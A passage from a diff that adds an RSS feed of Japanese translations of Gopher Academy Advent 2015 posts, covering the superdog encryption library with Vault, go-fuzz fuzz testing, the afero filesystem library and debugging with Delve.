+BenchmarkKeyDecryptGCM-8	 3000000	       520 ns/op
+BenchmarkKeyDecryptOFB-8	 2000000	       817 ns/op
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;usage:1fce78842ee22ab0726cd2d4dbda0bd4&#34;&gt;Usage&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;go get -u github.com/xordataexchange/superdog/...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;暗号化:1fce78842ee22ab0726cd2d4dbda0bd4&#34;&gt;暗号化&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;val := []byte(&amp;quot;encrypt me!&amp;quot;)
+
+// use a key prefix to delineate different crypto keys
+// allowing you to use different keys for different parts of your application
+// or different fields of a database table, for example
+b, err := superdog.Encrypt(&amp;quot;mykeyprefix&amp;quot;, val, val)
+if err != nil {
+	// handle error
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;復号:1fce78842ee22ab0726cd2d4dbda0bd4&#34;&gt;復号&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;b := []byte[&amp;quot;some crypt cypher text here&amp;quot;]
+decrypted, err := superdog.Decrypt([]byte(&amp;quot;mykeyprefix&amp;quot;, b, b)
+if err != nil {
+	// handle error
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;プロダクション環境での利用:1fce78842ee22ab0726cd2d4dbda0bd4&#34;&gt;プロダクション環境での利用&lt;/h3&gt;
+
+&lt;p&gt;&lt;code&gt;superdog&lt;/code&gt;はデフォルトでは静的な鍵とIVによる&lt;code&gt;DevKeyProvider&lt;/code&gt;を使う。安全ではないので決してプロダクション環境では使うべきではない。&lt;/p&gt;
+
+&lt;p&gt;プロダクション環境ではGoの&lt;a href=&#34;https://golang.org/pkg/go/build/&#34;&gt;ビルドタグ&lt;/a&gt;を使って強固な暗号を有効にすることを推奨する。&lt;/p&gt;
+
+&lt;p&gt;init()関数の中で接続処理を行うファイルを作成し、&lt;code&gt;// +build production&lt;/code&gt;というビルドタグをファイルの冒頭に記載する。
+以下に例を示す。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// +build production
+
+package main
+import (
+	&amp;quot;github.com/xordataexchange/superdog&amp;quot;
+	&amp;quot;github.com/xordataexxchange/superdog/vault/hashi&amp;quot;
+	&amp;quot;github.com/hashicorp/vault/api&amp;quot;
+)
+
+// Assign each application a unique UUID
+// and use Vault&#39;s AppID authentication mechanism
+const (
+	appid = &amp;quot;SOME RANDOM UUID&amp;quot;
+)
+
+func init() {
+	user := os.Getenv(&amp;quot;VAULT_USER&amp;quot;)
+	vaultaddr := os.Getenv(&amp;quot;VAULT_ADDRESS&amp;quot;)
+	// TEST these for empty strings &amp;amp; handle appropriately in your code
+
+	cfg:= api.DefaultConfig()
+	cfg.Address = vaultaddr
+
+	vault, err := hashi.NewVault(cfg)
+	if err != nil {
+		// handle appropriately
+	}
+	err = vault.AuthAppID(appid, user)
+	if err != nil {
+		// handle appropriately
+	}
+
+	crypto.DefaultKeyProvider = vault
+	crypto.DefaultSaltProvider = vault
+
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;go build -tag production&lt;/code&gt;を実行すると、このコードを含むようにプログラムがコンパイルされる。
+&lt;code&gt;KeyProvider&lt;/code&gt;はVaultを使うようにセットされる。&lt;/p&gt;
+
+&lt;h2 id=&#34;コントリビューション歓迎:1fce78842ee22ab0726cd2d4dbda0bd4&#34;&gt;コントリビューション歓迎&lt;/h2&gt;
+
+&lt;p&gt;Superdogをお楽しみ頂ければ幸いだ。我々はコミュニティからのコントリビューションをいつでも歓迎する。
+Superdogは信頼できる安全策を使って安全かつ確実なデータアクセスを提供するという我々のミッションを支えている。
+Superdogの元々の実装はErik St. Martinによって書かれたものである。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>12月5日 - Go Fuzz</title>
+      <link>http://localhost:1313/gopheracademy-advent-2015-ja/5-go-fuzz-ja/</link>
+      <pubDate>Thu, 31 Dec 2015 15:09:24 -0800</pubDate>
+      
+      <guid>http://localhost:1313/gopheracademy-advent-2015-ja/5-go-fuzz-ja/</guid>
+      <description>&lt;div class=&#39;note&#39;&gt;※本ポストは&lt;a href=&#34;https://blog.gopheracademy.com/&#34;&gt;Gopher Academy&lt;/a&gt;の&lt;a href=&#34;https://blog.gopheracademy.com/series/advent-2015/&#34;&gt;Advent 2015&lt;/a&gt;の&lt;a href=&#34;https://blog.gopheracademy.com/advent-2015/go-fuzz/&#34;&gt;12月5日の記事&lt;/a&gt;の日本語訳です。&lt;/div&gt;
+
+&lt;p&gt;今年の4月にDmitry Vyukovが&lt;a href=&#34;https://github.com/dvyukov/go-fuzz&#34;&gt;go-fuzz&lt;/a&gt;という&lt;a href=&#34;http://lcamtuf.coredump.cx/afl/&#34;&gt;afl&lt;/a&gt;に着想を得たカバレッジ誘導型のファズテストツールをリリースした。
+彼は密かにこのツールをGoの標準ライブラリに対して適用し、自動化れたランダムなテストを実行することで、クラッシュを引き起こすような不具合を始めとした多くのバグを報告した。&lt;/p&gt;
+
+&lt;p&gt;ファジングとはランダムなデータを与えてテストを行うことだ。
+これは&lt;a href=&#34;http://pages.cs.wisc.edu/~bart/fuzz/&#34;&gt;1980年後半のBarton Miller教授の研究&lt;/a&gt;まで遡る。
+2000年代になるとクラッシュがエクスプロイトコードとして使われる可能性があったことから、セキュリティ系のコミュニティで取り上げられるようになった。
+aflやgo-fuzzのようなカバレッジ誘導型のファジングは、実行時に集めたどのコードパスが実行されたかという情報を使って、ランダムな入力データが&amp;rdquo;interesting&amp;rdquo;(訳注:関心を寄せるべきデータであるかみたいな意味だと思われます)かどうか及び更なるランダムテストを実行する際のseedとして利用するべきかを決定する。&lt;/p&gt;
+
+&lt;p&gt;ユーザからの入力を受け取る全てのプログラムは予期せぬ入力をきちんとハンドリングできることを確認するためにファズテストを行うべきである。
+ファイルのフォーマットやシリアライズ、圧縮アルゴリズムのパッケージ等では特に有用である。&lt;/p&gt;
+
+&lt;p&gt;しかし、Goの標準ライブラリで多くの問題を発見したという大いなる成功にも関わらず、当初は僅かな人しか使っていないようだった。&lt;/p&gt;
+
+&lt;p&gt;7月の初めにDmitryはGopherconにて&lt;a href=&#34;https://www.youtube.com/watch?v=a9xrxRsIbSU&#34;&gt;go-fuzzの発表&lt;/a&gt;を行った。&lt;/p&gt;
+
+&lt;p&gt;Go1.5のリリースに向けて、私は&lt;a href=&#34;https://groups.google.com/forum/#!topic/Golang-Nuts/4PmyYvcnpIs&#34;&gt;fuzz-a-thon&lt;/a&gt;を開始した。
+アイデアはシンプルで&amp;rdquo;DmitryはGoの標準ライブラリをロバストにするために最善を尽くしている&amp;rdquo;というものだ。
+我々コミュニティも我々のパッケージに対して同様のことをする必要がある。
+私は&lt;a href=&#34;https://twitter.com/search?f=tweets&amp;amp;vertical=default&amp;amp;q=%23golangfuzz&#34;&gt;毎日go-fuzzを使うべき理由をツイート&lt;/a&gt;した。&lt;/p&gt;
+
+&lt;p&gt;8月の初めになると、Filippo ValsordaがCloudFlareでのgo-fuzzの利用に関する&lt;a href=&#34;https://blog.cloudflare.com/dns-parser-meet-go-fuzzer/&#34;&gt;素晴らしいポスト&lt;/a&gt;をしてくれた。
+Filippoのポスト(および彼の&lt;a href=&#34;https://www.youtube.com/watch?v=QEhPaj3vvPA&#34;&gt;GothamGoでのトーク&lt;/a&gt;)はプログラムをクラッシュさせるインプットデータを探すだけでなく、ランダムなテストにgo-fuzzを使う様々な方法の詳細を述べている。&lt;/p&gt;
+
+&lt;p&gt;その数週間後、私もシンプルなファイルフォーマット用ライブラリに対してファジング及びパッチする簡単なガイドを&lt;a href=&#34;https://medium.com/@dgryski/go-fuzz-github-com-arolek-ase-3c74d5a3150c&#34;&gt;ポスト&lt;/a&gt;した。&lt;/p&gt;
+
+&lt;p&gt;人々はgo-fuzzを使うようになってきた。多くのパッケージがファズテストを含むようになってきている。
+&lt;a href=&#34;https://github.com/dvyukov/go-fuzz#trophies&#34;&gt;go-fuzz trophy case&lt;/a&gt;は400ものバグを含んでいる。&lt;/p&gt;
+
+&lt;p&gt;是非ご自身のコードもファズテストしてみて頂きたい。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>12月4日 - afero: A Universal Filesystem Library</title>
+      <link>http://localhost:1313/gopheracademy-advent-2015-ja/4-afero-a-universal-filesystem-library-ja/</link>
+      <pubDate>Thu, 31 Dec 2015 15:09:22 -0800</pubDate>
+      
+      <guid>http://localhost:1313/gopheracademy-advent-2015-ja/4-afero-a-universal-filesystem-library-ja/</guid>
+      <description>
+
+&lt;div class=&#39;note&#39;&gt;※本ポストは&lt;a href=&#34;https://blog.gopheracademy.com/&#34;&gt;Gopher Academy&lt;/a&gt;の&lt;a href=&#34;https://blog.gopheracademy.com/series/advent-2015/&#34;&gt;Advent 2015&lt;/a&gt;の&lt;a href=&#34;https://blog.gopheracademy.com/advent-2015/afero-a-universal-filesystem-library/&#34;&gt;12月2日の記事&lt;/a&gt;の日本語訳です。&lt;/div&gt;
+
+&lt;p&gt;少しでも私と開発の話をしたことがある人は私がGoを愛していることをご存知だろう。私の&lt;a href=&#34;https://github.com/spf13&#34;&gt;Githubのレポジトリ&lt;/a&gt;と&lt;a href=&#34;http://spf13.com/&#34;&gt;ブログ&lt;/a&gt;はGoへのラブレターのようなものだ。
+今日はこの1年間私が取り組んできたことをシェアしようと思う。これが皆さんにとって素晴らしいものになれば幸いだ。&lt;/p&gt;
+
+&lt;p&gt;多くのアプリケーションはファイルやフォルダの作成・編集・削除をするためにファイルシステムにアクセスする必要があるが、毎回OSのパッケージを直接呼び出すことに私は違和感を感じている。
+他の言語の経験からプログラム外部との依存性は可能な限り避けるべきだと学んできた。そうすることで外部要因に関係なく適切なテストができるからだ。&lt;/p&gt;
+
+&lt;p&gt;もし様々なバックエンドにプラグイン可能な抽象的な仮想メモリフレームワークがあったらどうだろう。単体テストする際に素晴らしいというだけでなく、様々な可能性があるだろう。
+&lt;a href=&#34;https://gohugo.io/&#34;&gt;Hugo&lt;/a&gt;の開発でOSコールをすればするほどにこの考えが心に残り続けていた。そしてついに決めた。抽象的なファイルシステムフレームワークを誰も作っていないようなので私が作ることにした。
+その2日後に&lt;a href=&#34;https://github.com/spf13/afero&#34;&gt;Afero&lt;/a&gt;が生まれた。&lt;/p&gt;
+
+&lt;h2 id=&#34;aferoファイルシステムフレームワークのデザイン:bf5e1e068bf8f5db398587b0bbfff5f2&#34;&gt;Aferoファイルシステムフレームワークのデザイン&lt;/h2&gt;
+
+&lt;p&gt;GoのインターフェースはAferoのようなフレームワークには最適だった。
+定義済みの標準インターフェースを使って誰でもAferoを他のバックエンド向けに拡張できる。
+Aferoはインターフェースを通じて様々なファイルシステム(一般的にはファイルシステムと考えられていないようなものも含む)にアクセスするための単一のAPIを提供する。
+Aferoはこれら2つのインターフェースを通じてメモリキャッシュからzipファイルやリモートのファイルシステムに至るまで同様に表現することができる。&lt;/p&gt;
+
+&lt;p&gt;標準ライブラリは既にOS、特に我々の目的であるOSのファイル操作を行う、プラットフォーム非依存のインターフェースを提供する素晴らしい&lt;a href=&#34;https://golang.org/pkg/os/&#34;&gt;OSパッケージ&lt;/a&gt;がある。
+OSパッケージはファイルシステムが必要とするファイル・ディレクトリ操作を表す関数や型のセットの責務を大変上手く分割している。&lt;/p&gt;
+
+&lt;p&gt;OSパッケージをガイドとしてインターフェースを定義することを決めた。
+これは良いスタート地点であると同時にく、OSパッケージを互換性のあるバックエンドとして使え、OSパッケージからAferoへの移行を容易にするだろう。&lt;/p&gt;
+
+&lt;h3 id=&#34;the-afero-file-system-interface:bf5e1e068bf8f5db398587b0bbfff5f2&#34;&gt;The Afero File System Interface&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type Fs interface {
+	Create(name string) (File, error)
+	Mkdir(name string, perm os.FileMode) error
+	MkdirAll(path string, perm os.FileMode) error
+	Open(name string) (File, error)
+	OpenFile(name string, flag int, perm os.FileMode) (File, error)
+	Remove(name string) error
+	RemoveAll(path string) error
+	Rename(oldname, newname string) error
+	Stat(name string) (os.FileInfo, error)
+	Name() string
+	Chmod(name string, mode os.FileMode) error
+	Chtimes(name string, atime time.Time, mtime time.Time) error
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;the-afero-file-interface:bf5e1e068bf8f5db398587b0bbfff5f2&#34;&gt;The Afero File Interface&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type File interface {
+	io.Closer
+	io.Reader
+	io.ReaderAt
+	io.Seeker
+	io.Writer
+	io.WriterAt
+
+	Name() string
+	Readdir(count int) ([]os.FileInfo, error)
+	Readdirnames(n int) ([]string, error)
+	Stat() (os.FileInfo, error)
+	Sync() error
+	Truncate(size int64) error
+	WriteString(s string) (ret int, err error)
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;aferoのコアライブラリの実装:bf5e1e068bf8f5db398587b0bbfff5f2&#34;&gt;Aferoのコアライブラリの実装&lt;/h2&gt;
+
+&lt;p&gt;インターフェースは良いと思うがインターフェースを実装したライブラリがいくつか無い限りは、使い物になるかが分からない。
+最初の実装はこのアイデアがちゃんと動くかを証明するためだけのものだった。&lt;/p&gt;
+
+&lt;h3 id=&#34;osバックエンドの実装:bf5e1e068bf8f5db398587b0bbfff5f2&#34;&gt;OSバックエンドの実装&lt;/h3&gt;
+
+&lt;p&gt;OSのバックエンドの実装は単なるラッパーでしかないので取るに足らないものだった。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type OsFs struct{}
+
+func (OsFs) Name() string { return &amp;quot;OsFs&amp;quot; }
+
+func (OsFs) Create(name string) (File, error) { return os.Create(name)}
+
+func (OsFs) Mkdir(name string, perm os.FileMode) error { return os.Mkdir(name, perm)}
+
+func (OsFs) MkdirAll(path string, perm os.FileMode) error { return os.MkdirAll(path, perm)}
+
+func (OsFs) Open(name string) (File, error) { return os.Open(name)}
+
+func (OsFs) OpenFile(name string, flag int, perm os.FileMode) (File, error) { return os.OpenFile(name, flag, perm)}
+
+func (OsFs) Remove(name string) error { return os.Remove(name)}
+
+func (OsFs) RemoveAll(path string) error { return os.RemoveAll(path)}
+
+func (OsFs) Rename(oldname, newname string) error { return os.Rename(oldname, newname) }
+
+func (OsFs) Stat(name string) (os.FileInfo, error) { return os.Stat(name)}
+
+func (OsFs) Chmod(name string, mode os.FileMode) error { return os.Chmod(name, mode)}
+
+func (OsFs) Chtimes(name string, atime time.Time, mtime time.Time) error { return os.Chtimes(name, atime, mtime)}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;メモリベースのバックエンドの実装:bf5e1e068bf8f5db398587b0bbfff5f2&#34;&gt;メモリベースのバックエンドの実装&lt;/h3&gt;
+
+&lt;p&gt;メモリベースのバックエンドこそがAferoを作った当初の理由だった。
+ramディスク等の複雑なセットアップをせずにクロスプラットフォームな方法でディスクではなくメモリからファイルのレンダリングができたらHugoはもっと速くなるのではないかと思っていた。
+テストの環境を気にせずファイルを簡単にセットアップできるようなテストのためにも使いたかった。
+テストの実行時や完了後にファイルのクリーンアップをした際にファイルの状態を気にしたくなかった。&lt;/p&gt;
+
+&lt;p&gt;結果としてFileインターフェースを実装したものとFSインターフェースを実装した2つのgoのファイルを作ることになった。&lt;/p&gt;
+
+&lt;p&gt;このメモリベースのバックエンドを使ってOSのテストスイートをパスできたら実装が確かなものであると言えるだろう。&lt;/p&gt;
+
+&lt;h3 id=&#34;メモリファイル:bf5e1e068bf8f5db398587b0bbfff5f2&#34;&gt;メモリファイル&lt;/h3&gt;
+
+&lt;p&gt;ここでは考えなければならないことがたくさんある。OSはロック等の機能を提供するが、我々は自分で実装しなければならない。さらにいくつかの機能はramの中の数バイトでしかない場合同じようには行かないだろう。
+いくつかの実験の結果、以下のstructがファイルの必要な情報とデータを格納する上で十分であることが分かった。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type InMemoryFile struct {
+	// atomic requires 64-bit alignment for struct field access
+	at           int64
+	readDirCount int64
+	sync.Mutex
+	name    string
+	data    []byte
+	memDir  MemDir
+	dir     bool
+	closed  bool
+	mode    os.FileMode
+	modtime time.Time
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;byteのsliceの利用はファイルに関するデータを格納する素晴らしい方法であることが分かった。これはSeekとReadAtの要求が容易に満たせると同時に、Goの中で最適化されたsliceのサイジング処理の恩恵を受けることができる。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func (f *InMemoryFile) Seek(offset int64, whence int) (int64, error) {
+	if f.closed == true {
+		return 0, ErrFileClosed
+	}
+	switch whence {
+	case 0:
+		atomic.StoreInt64(&amp;amp;f.at, offset)
+	case 1:
+		atomic.AddInt64(&amp;amp;f.at, int64(offset))
+	case 2:
+		atomic.StoreInt64(&amp;amp;f.at, int64(len(f.data))+offset)
+	}
+	return f.at, nil
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;実装の詳細を全て見ていくことはしないが、興味があれば&lt;a href=&#34;https://github.com/spf13/afero/blob/master/memfile.go&#34;&gt;github&lt;/a&gt;を見て頂きたい。&lt;/p&gt;
+
+&lt;h3 id=&#34;メモリファイルシステム:bf5e1e068bf8f5db398587b0bbfff5f2&#34;&gt;メモリファイルシステム&lt;/h3&gt;
+
+&lt;p&gt;迅速にファイルシステムを実装する最も簡単な方法はmapを使うことだと思っていた。mapはフラットな構造なのに対してファイルシステムはツリー(少なくとも我々はそう捉える)なのでこれは若干トリッキーではある。
+実際はファイルシステムは単にパスによるファイルのリストでしかない。我々はファイルシステムをツリーと見るが、パスはただの文字列と捉えることができる。パスと呼ばれる属性を持ったファイルの一覧と見ることができる。
+この認識はファイルシステムをmapとして実装するのを容易にしてくれる。mapは小さな構造向けには理にかなっていて迅速に実装できるが、基数木(radix tree)のような構造の方がファイルサーチには効率的だとは思っている。&lt;/p&gt;
+
+&lt;h3 id=&#34;ディレクトリ:bf5e1e068bf8f5db398587b0bbfff5f2&#34;&gt;ディレクトリ&lt;/h3&gt;
+
+&lt;p&gt;ディレクトリにはどのようにアプローチすべきか自信がなかった。ディスク上ではディレクトリは具体的な目的があるが、メモリ上ではそうではない(少なくとも私がとったアプローチでは)。
+しばらくしてからディレクトリはファイルと同じプロパティを持つので、ファイルと同様に扱うべきだと気づいた。ディレクトリであることを意味する&lt;code&gt;dir&lt;/code&gt;フラグを追加した。
+このアプローチによって対応するパスを持つファイル(今回の実装ではパスはただのプロパティなので)を作成するためにディレクトリを保持する必要はなくなった。
+これが従来のファイルシステムの操作と互換性を持つことを確認するために従来の挙動を可能な限りエミュレートしてみた。それぞれのディレクトリは配下のファイルのポインタのsliceを持っている。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type MemDir interface {
+	Len() int
+	Names() []string
+	Files() []File
+	Add(File)
+	Remove(File)
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;インターフェースは制約ではなくガイドだと認識することが重要だ。Goのインターフェースの最も素晴らしい点の一つは規約的な意味ではなく実装を満たしていればいくらでも拡張できることだ。
+我々の目的を達成するため、簡単かつ高速なファイルシステム操作を行うための関数を追加した。
+これが常に最新であることを保証するためには追加の処理が必要だろう。
+この機能はインターフェースで定められてはいないが、実装をクリーンにするために有益であった。
+この関数は与えられたファイルまたはディレクトリが親ディレクトリに登録されていることを保証してくれる。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func (m *MemMapFs) registerWithParent(f File) {
+	if f == nil {
+		return
+	}
+	parent := m.findParent(f)
+	if parent == nil {
+		pdir := filepath.Dir(path.Clean(f.Name()))
+		err := m.lockfreeMkdir(pdir, 0777)
+		if err != nil {
+			return
+		}
+		parent, err = m.lockfreeOpen(pdir)
+		if err != nil {
+			return
+		}
+	}
+	pmem := parent.(*InMemoryFile)
+
+	if pmem.memDir == nil {
+		pmem.dir = true
+		pmem.memDir = &amp;amp;MemDirMap{}
+	}
+
+	pmem.memDir.Add(f)
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;aferoの拡張:bf5e1e068bf8f5db398587b0bbfff5f2&#34;&gt;Aferoの拡張&lt;/h2&gt;
+
+&lt;p&gt;Hugoが現在Aferoを使って全てのファイルシステム操作を行っているという点から、当初のアイデアは達成できた。
+最新版のHugoは&lt;code&gt;hugo server&lt;/code&gt;コマンドで性能アップのためにメモリストレージバックエンドを使っている。これはまだ始まりに過ぎず、コミュニティとしては今後もっと拡張して行きたいと思っている。&lt;/p&gt;
+
+&lt;p&gt;Aferoがtarとzipファイルをサポートしたら素晴らしいだろう。標準ライブラリは既に安定かつ完全なzipとtarのパッケージを提供している。誰かがAferoに互換性のあるインターフェースを提供する必要がある。
+AferoがSCP/SSHやS3等のクラウドストレージをサポートできたら素敵だろう。もしこれらの実装が作られたら、コードを殆ど変更せずにこれら異なるシステムのネイティブなサポートを追加することができるだろう。&lt;/p&gt;
+
+&lt;p&gt;これらのファイルシステムの環境が整ったらさらなる一歩を踏み出すことができるだろう。他のファイルシステムをラップまたは結合するファイルシステムにおいて素晴らしい価値があるだろう。
+例えば遅いS3のファイルシステムの前に置かれたローカルディスク上のキャッシュファイルシステム等が挙げられる。
+別の明らかな利点はディスクやネットワークのフロントにメモリファイルシステムを置く場合だ。
+このような方法でファイルシステムを組み合わせる場合、様々な機能が考えられる。バージョニング、ジャーナリング、オンザフライの圧縮等だ。&lt;/p&gt;
+
+&lt;p&gt;このプロジェクトがあなたにとって有益でコミュニティが作り出す素晴らしいバックエンドを楽しみにしてくれることを願っている。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>12月3日 - Debugging Go programs with Delve </title>
+      <link>http://localhost:1313/gopheracademy-advent-2015-ja/3-debugging-with-delve-ja/</link>
+      <pubDate>Thu, 31 Dec 2015 15:09:20 -0800</pubDate>
+      
+      <guid>http://localhost:1313/gopheracademy-advent-2015-ja/3-debugging-with-delve-ja/</guid>
+      <description>
+
+&lt;div class=&#39;note&#39;&gt;※本ポストは&lt;a href=&#34;https://blog.gopheracademy.com/&#34;&gt;Gopher Academy&lt;/a&gt;の&lt;a href=&#34;https://blog.gopheracademy.com/series/advent-2015/&#34;&gt;Advent 2015&lt;/a&gt;の&lt;a href=&#34;https://blog.gopheracademy.com/advent-2015/debugging-with-delve/&#34;&gt;12月3日の記事&lt;/a&gt;の日本語訳です。&lt;/div&gt;
+
+&lt;p&gt;バグトラッキングはイライラする作業である。並列処理のコードでは特にそうだろう。難しかったり再現させにくいバグをトラッキングする際は、優れたデバッガを自在に使えたら状況が一変するだろう。
+このポストではGoのデバッガである&lt;a href=&#34;https://github.com/derekparker/delve&#34;&gt;Delve&lt;/a&gt;について説明しよう。&lt;/p&gt;
+
+&lt;p&gt;Delveは&lt;a href=&#34;https://www.gnu.org/software/gdb/&#34;&gt;GDB&lt;/a&gt;等の従来のツールを使ってGoのデバッグをしている時に開発者が感じる様々な問題を解決することを目的としている。
+なぜ既存のツールが十分でないのかは&lt;a href=&#34;https://golang.org/doc/gdb&#34;&gt;gdbのドキュメント&lt;/a&gt;のIntroductionの段落を見て頂くか、ツールの技術的な詳細を語った私の&lt;a href=&#34;https://www.youtube.com/watch?v=InG72scKPd4&#34;&gt;Gophercon2015の発表&lt;/a&gt;を見て頂くとよく分かるだろう。&lt;/p&gt;
+
+&lt;p&gt;以下ではDelveをもう少し詳しく見ていき、使用例を紹介しよう。&lt;/p&gt;
+
+&lt;h2 id=&#34;セットアップ:a1b4b0400b669ac17eb59f631a77958a&#34;&gt;セットアップ&lt;/h2&gt;
+
+&lt;p&gt;DelveはLinuxとOSX上でのみサポートされているがWindowsも&lt;a href=&#34;https://github.com/derekparker/delve/pull/276&#34;&gt;まもなくサポートされる。&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;まだDelveをインストールしていなければ&lt;a href=&#34;https://github.com/derekparker/delve/wiki/Building&#34;&gt;インストール方法&lt;/a&gt;を確認して使い始めて見て欲しい。
+OSXを使っている場合は手順に従ってバイナリにコード署名する必要がある。インストールが完了したらGoのプログラムをデバッグする準備は完了である。&lt;/p&gt;
+
+&lt;h2 id=&#34;プログラムのデバッグ:a1b4b0400b669ac17eb59f631a77958a&#34;&gt;プログラムのデバッグ&lt;/h2&gt;
+
+&lt;p&gt;正直になろう。デバッガを使おうとしているということは既に物事が思い通り行っていないということだ。
+プログラムが動かなくてなぜだか分からない状態だ。
+この状態ではツールが邪魔になるべきではない。
+使いやすさが一番だが、これをデバッグセッションをどう始めるか説明することでデモできる。&lt;/p&gt;
+
+&lt;h3 id=&#34;ビルドとデバッグ:a1b4b0400b669ac17eb59f631a77958a&#34;&gt;ビルドとデバッグ&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go:&#34;&gt;$ dlv debug
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;go build&lt;/code&gt;を実行するディレクトリと同じディレクトリで上記のコマンドを実行すると、プログラムをコンパイルし、デバッグ用のflag付きでバイナリを生成し、プログラムを起動、デバッガのアタッチ、プログラムを調査するためのプロンプトが立ち上がる。&lt;/p&gt;
+
+&lt;h3 id=&#34;テスト用バイナリのビルドとデバッグ:a1b4b0400b669ac17eb59f631a77958a&#34;&gt;テスト用バイナリのビルドとデバッグ&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;$ dlv test
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;main&lt;/code&gt;関数が無い、またはテストコードの実行環境でプログラムをデバッグしたい場合、上記のコマンドを使う。これも先ほどの例と同様にテストのバイナリをビルドし、デバッグ用にflagを付与し、デバッグ用のプロンプトが立ち上がる。&lt;/p&gt;
+
+&lt;h3 id=&#34;実行中のプロセスへのアタッチ:a1b4b0400b669ac17eb59f631a77958a&#34;&gt;実行中のプロセスへのアタッチ&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;$ dlv attach &amp;lt;pid&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;実行中のプロセスにアタッチしてデバッグを開始する。このコマンドは即座にプロセスを停止してデバッグのセッションを開始する。ただし特定の最適化がされたバイナリに対してデバッグしようとすると問題が起こる可能性がある。&lt;/p&gt;
+
+&lt;h3 id=&#34;デバッグではなくトレース:a1b4b0400b669ac17eb59f631a77958a&#34;&gt;デバッグではなくトレース&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;$ dlv trace [regexp]
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;[regexp]&lt;/code&gt;にマッチする関数にトレースポイントをセットしプログラムをコンパイル、開始する。
+これはフルデバッグセッションを開始しないがトレースポイントに達した際に情報を出力する。&lt;/p&gt;
+
+&lt;h3 id=&#34;その他のコマンド:a1b4b0400b669ac17eb59f631a77958a&#34;&gt;その他のコマンド&lt;/h3&gt;
+
+&lt;p&gt;ここまで紹介したものが最もよく使うコマンドになるだろうが、他にも以下のようなコマンドがある。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;dlv exec ./path/to/binary&lt;/code&gt; - 既存のバイナリの実行とアタッチ&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;dlv connect&lt;/code&gt; - headlessデバッグサーバに接続&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;さぁやってみよう:a1b4b0400b669ac17eb59f631a77958a&#34;&gt;さぁやってみよう&lt;/h2&gt;
+
+&lt;p&gt;&lt;code&gt;(dlv)&lt;/code&gt;というプロンプトが表示され、プログラムの調査を始める準備が整った。&lt;/p&gt;
+
+&lt;p&gt;以下のような小さいプログラムを考えてみよう。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main
+
+import (
+	&amp;quot;fmt&amp;quot;
+	&amp;quot;sync&amp;quot;
+)
+
+func dostuff(wg *sync.WaitGroup, i int) {
+	fmt.Printf(&amp;quot;goroutine id %d\n&amp;quot;, i)
+	fmt.Printf(&amp;quot;goroutine id %d\n&amp;quot;, i)
+	wg.Done()
+}
+
+func main() {
+	var wg sync.WaitGroup
+	workers := 10
+
+	wg.Add(workers)
+	for i := 0; i &amp;lt; workers; i++ {
+		go dostuff(&amp;amp;wg, i)
+	}
+	wg.Wait()
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;dlv debug&lt;/code&gt;を入力してデバッグセッションを開始し、以下のように&lt;code&gt;main&lt;/code&gt;にブレークポイントを設定しよう&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;(dlv) break main.main
+Breakpoint 1 set at 0x22c7 for main.main ./test.go:15
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;出力結果はブレークポイントのIDとブレークポイントがセットされたアドレス、関数名、ファイル名:行番号となっている。&lt;/p&gt;
+
